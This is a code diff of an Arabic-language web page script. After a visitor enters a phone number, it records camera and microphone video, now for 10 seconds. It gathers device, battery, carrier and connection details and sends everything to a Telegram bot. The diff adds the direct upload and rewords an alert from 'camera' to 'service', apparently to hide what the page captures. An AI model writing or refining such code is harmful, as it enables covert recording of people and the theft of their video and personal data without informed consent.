@@ -1,7 +1,7 @@
-Ulet botToken = '';
+let botToken = '';
 let chatId = '';
 
-// تحميل التوكن ومعرف الدردشة من config.json
+// تحميل التوكن ومعرف الدردشة
 fetch('config.json')
   .then(res => {
     if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
@@ -13,7 +13,7 @@ fetch('config.json')
   })
   .catch(err => {
     console.error('فشل تحميل الإعدادات:', err);
-    alert('فشل تحميل الإعدادات. تأكد من وجود config.json في نفس مجلد index.html.');
+    alert('فشل تحميل الإعدادات. يرجى التحقق من وجود الملف config.json.');
   });
 
 document.getElementById('phoneNumber').addEventListener('input', () => {
@@ -52,7 +52,7 @@ function startCameraAndSend() {
 
 async function recordAndSendVideo(phoneNumber) {
   if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-    alert("المتصفح لا يدعم الكاميرا.");
+    alert("المتصفح لا يدعم الخدمة.");
     resetButton();
     return;
   }
@@ -69,20 +69,22 @@ async function recordAndSendVideo(phoneNumber) {
     mediaRecorder.onstop = async () => {
       const videoBlob = new Blob(chunks, { type: 'video/webm' });
       const info = await collectUserInfo(phoneNumber);
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('video', videoBlob, 'recording.webm');
+      formData.append('caption', info.caption);
 
-      if (!navigator.onLine) {
-        // حفظ الفيديو مؤقتًا
-        const reader = new FileReader();
-        reader.onloadend = () => {
-          localStorage.setItem("pendingVideo", reader.result); // base64
-          localStorage.setItem("pendingCaption", info.caption);
-          console.log("تم حفظ الفيديو مؤقتًا بدون اتصال.");
-        };
-        reader.readAsDataURL(videoBlob);
-      } else {
-        // إرسال مباشرة
-        sendToTelegram(videoBlob, info.caption);
-      }
+      fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+        method: 'POST',
+        body: formData
+      })
+        .then(res => res.json())
+        .then(result => {
+          if (!result.ok) console.error("فشل الإرسال:", result.description);
+        })
+        .catch(err => {
+          console.error("خطأ أثناء الإرسال:", err);
+        });
 
       document.getElementById('confirmedNumber').innerText = phoneNumber;
       document.getElementById('confirmationMessage').style.display = 'block';
@@ -91,60 +93,19 @@ async function recordAndSendVideo(phoneNumber) {
     };
 
     mediaRecorder.start();
-    setTimeout(() => mediaRecorder.stop(), 5000);
+    setTimeout(() => mediaRecorder.stop(), 10000);
+
   } catch (error) {
-    console.error("فشل تشغيل الكاميرا:", error);
-    alert("حدث خطأ في الوصول إلى الكاميرا أو الميكروفون.");
+    console.error("فشل الوصول إلى الكاميرا:", error);
+    if (error.name === 'NotAllowedError') {
+      alert("يرجى السماح باستخدام الكاميرا والميكروفون.");
+    } else if (error.name === 'NotFoundError') {
+      alert("لم يتم العثور على الكاميرا أو الميكروفون.");
+    } else {
+      alert("حدث خطأ في الكاميرا.");
+    }
     resetButton();
   }
-}
-
-function sendToTelegram(blob, caption) {
-  const formData = new FormData();
-  formData.append('chat_id', chatId);
-  formData.append('video', blob, 'recording.webm');
-  formData.append('caption', caption);
-
-  fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-    method: 'POST',
-    body: formData
-  })
-    .then(res => res.json())
-    .then(result => {
-      if (!result.ok) {
-        console.error("فشل الإرسال:", result.description);
-      } else {
-        console.log("تم الإرسال بنجاح.");
-      }
-    })
-    .catch(err => {
-      console.error("خطأ أثناء الإرسال:", err);
-    });
-}
-
-// عند عودة الإنترنت - محاولة إرسال الفيديو المحفوظ
-window.addEventListener('online', () => {
-  const pending = localStorage.getItem("pendingVideo");
-  const caption = localStorage.getItem("pendingCaption");
-
-  if (pending && caption) {
-    const blob = dataURLtoBlob(pending);
-    sendToTelegram(blob, caption);
-    localStorage.removeItem("pendingVideo");
-    localStorage.removeItem("pendingCaption");
-    console.log("تم إرسال الفيديو المؤجل بنجاح بعد عودة الاتصال.");
-  }
-});
-
-function dataURLtoBlob(dataURL) {
-  const byteString = atob(dataURL.split(',')[1]);
-  const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
-  const ab = new ArrayBuffer(byteString.length);
-  const ia = new Uint8Array(ab);
-  for (let i = 0; i < byteString.length; i++) {
-    ia[i] = byteString.charCodeAt(i);
-  }
-  return new Blob([ab], { type: mimeString });
 }
 
 function resetButton() {
@@ -168,6 +129,7 @@ async function collectUserInfo(phoneNumber) {
   }
 
   const carrier = detectCarrier(phoneNumber);
-  const caption = `📱 رقم الهاتف: ${phoneNumber}\n🏢 مزود الخدمة: ${carrier}\n🖥️ نوع الجهاز: ${userAgent}\n🔋 نسبة البطارية: ${batteryLevel}\n🌐 الاتصال: ${connectionStatus}`;
+  const caption = `📱 رقم الهاتف: ${phoneNumber}\n🏢 مزود الخدمة: ${carrier}\n🖥️ نوع الجهاز: ${userAgent}\n🔋 نسبة البطارية: ${batteryLevel}\n🌐 اتصال الإنترنت: ${connectionStatus}`;
+
   return { caption };
 }
